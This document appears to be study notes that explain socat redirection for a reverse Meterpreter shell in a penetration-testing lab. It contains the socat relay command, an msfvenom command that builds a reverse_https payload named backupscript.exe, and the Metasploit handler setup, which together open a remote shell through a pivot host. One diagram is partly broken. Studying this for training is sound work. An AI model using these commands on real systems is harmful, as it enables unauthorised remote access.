# Socat Redirection with a Reverse Shell


```text
1. Windows Target
2. Ubuntu Server = Redirector / Pivot
3. Kali = Attack Host / Metasploit Listener
```

The whole idea is:

> **Windows cannot directly reach your Kali listener, but Windows can reach the Ubuntu server. So Ubuntu acts as a traffic relay using Socat.**

### Big picture

```text
                 ┌──────────────────────┐
                 │      KALI / HTB      │
                 │   10.10.14.18        │
                 │                      │
                 │ Metasploit Handler   │
                 │ 0.0.0.0 : 80         │
                 └──────────▲───────────┘
                            │
                       TCP connection
                            │
                      forwarded by
                         socat
                            │
                 ┌──────────┴───────────┐
                 │   UBUNTU / PIVOT     │
                 │   172.16.5.129       │
                 │                      │
                 │ socat :8080          │
                 │        ↓             │
                 │  10.10.14.18:80      │
                 └──────────▲───────────┘
                            │
                     TCP 8080
                            │
                 ┌──────────┴───────────┐
                 │    WINDOWS TARGET    │
                 │    10.129.202.64     │
                 │                      │
                 │  backupscript.exe    │
                 └──────────────────────┘
```

## 1. Why do we need Socat?

Normally you might do:

```text
Windows ───────────────► Kali:80
```

But suppose the Windows machine **cannot reach `10.10.14.18` directly**.

However:

```text
Windows ───────────────► Ubuntu:8080
```

is possible.

So we create:

```text
Windows
   ↓
Ubuntu:8080
   ↓
Socat
   ↓
Kali:80
```

Ubuntu becomes a **redirector**.

---

# 2. Socat command

On Ubuntu:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Read it as:

```text
LISTEN on TCP port 8080
        ↓
when connection arrives
        ↓
forward it to 10.10.14.18:80
```

So:

```text
Ubuntu:8080
     ↓
10.10.14.18:80
```

The `fork` means Socat can handle connections by creating a separate process for each connection.

---

# 3. Now the important part: Payload

They create:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 \
  LPORT=8080 \
  -f exe \
  -o backupscript.exe
```

This is the part that often confuses people.

The payload says:

```text
Connect to:
172.16.5.129:8080
```

Why?

Because **172.16.5.129 is the Ubuntu redirector**, which the Windows machine can reach.

So the Windows machine does:

```text
Windows
   │
   │ HTTPS reverse connection
   ▼
172.16.5.129:8080
   │
   │ Socat
   ▼
10.10.14.18:80
```

The Windows machine **doesn't know that Kali is ultimately receiving the connection**.

---

# 4. Why is the payload called `reverse_https`?

Because after execution, the Windows target initiates an outbound connection.

```text
Target ─────► Listener
```

instead of:

```text
Attacker ─────► Target
```

And `https` means the Meterpreter communication uses HTTPS.

Socat is just forwarding TCP traffic. It doesn't need to understand Meterpreter or HTTPS.

Think:

```text
Socat = traffic pipe
```

It doesn't care what is inside that traffic.

---

# 5. Metasploit Handler

On Kali:

```text
use exploit/multi/handler
```

Then:

```text
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

Notice:

### Payload

```text
LHOST=172.16.5.129
LPORT=8080
```

### Handler

```text
LHOST=0.0.0.0
LPORT=80
```

They are intentionally different.

Because:

```text
Payload:
"Where should I initially connect?"
        ↓
Ubuntu:8080
```

Then:

```text
Socat:
"Where should I forward that connection?"
        ↓
Kali:80
```

And:

```text
Handler:
"Where should I listen?"
        ↓
Kali:80
```

This is the most important diagram to remember:

```text

│                     │

└──────────┬──────────┘
           │
           │ 1. Connect to
           │ 172.16.5.129:8080
           ▼
┌─────────────────────────┐
│ Ubuntu Redirector       │
│ 172.16.5.129            │
│                         │
│ Socat :8080             │
└──────────┬──────────────┘
           │
           │ 2. Forward
           │ to 10.10.14.18:80

┌─────────────────────────┐

│ 10.10.14.18             │
```

---

# 7. Why `LHOST=0.0.0.0` on the handler?

You used:

```text
set lhost 0.0.0.0
```

That means:

> **Bind the listener to all local interfaces.**

It's not telling Windows to connect to `0.0.0.0`.

The Windows target connects to:

```text
172.16.5.129:8080
```

and Socat eventually sends the connection to:

```text
10.10.14.18:80
```

---

# 8. Why do we need `msfvenom` here?

This is a perfect example of when you **do need `msfvenom`**.

Metasploit's normal exploit module isn't delivering the payload.

Instead, you need a **standalone Windows executable**:

```text
backupscript.exe
```

So:

```text
msfvenom
   ↓
creates backupscript.exe
   ↓
transfer to Windows
   ↓
execute it
   ↓
reverse connection starts
```

This is exactly the distinction we discussed earlier.

---

# 9. Why do payload and handler need to match?

Payload:

```text
windows/x64/meterpreter/reverse_https
```

Handler:

```text
windows/x64/meterpreter/reverse_https
```

They need to be compatible because the handler has to understand the communication/session generated by that payload.

Think:

```text
Payload
   ↓
speaks a particular protocol/session format
   ↓
Handler
   ↓
must understand it
```

---

# 10. What happens when `backupscript.exe` runs?

Step-by-step:

```text
1. Windows executes backupscript.exe
                ↓
2. Payload tries 172.16.5.129:8080
                ↓
3. Ubuntu's Socat accepts connection
                ↓
4. Socat forwards it to 10.10.14.18:80
                ↓
5. Kali's Metasploit handler receives it
                ↓
6. Meterpreter communication starts
                ↓
7. Meterpreter session opens
```

Then:

```text
meterpreter > getuid
```

shows:

```text
INLANEFREIGHT\victor
```

That tells you the session is running in the security context of `victor`.

---

# 11. The key concept

This entire section is basically teaching you:

```text
DIRECT CONNECTION NOT POSSIBLE
          ↓
USE REACHABLE PIVOT/REDIRECTOR
          ↓
SOCAT FORWARDS TRAFFIC
          ↓
ATTACKER LISTENER RECEIVES IT
```

So memorize this:

```text
Target
  ↓
Redirector
  ↓
Attacker
```

And the three ports in this example:

```text
Windows
   ↓
172.16.5.129:8080
   ↓
Socat
   ↓
10.10.14.18:80
   ↓
Metasploit Handler
```

### One-line interview explanation

> **Socat acts as a TCP redirector: the target connects to the reachable pivot on port 8080, Socat relays that connection to the attacker's Metasploit handler on port 80, allowing the reverse Meterpreter session to traverse the pivot.**

The most important thing to understand is that **the payload's LHOST/LPORT point to the redirector, while the handler listens on the attacker's address/port.**
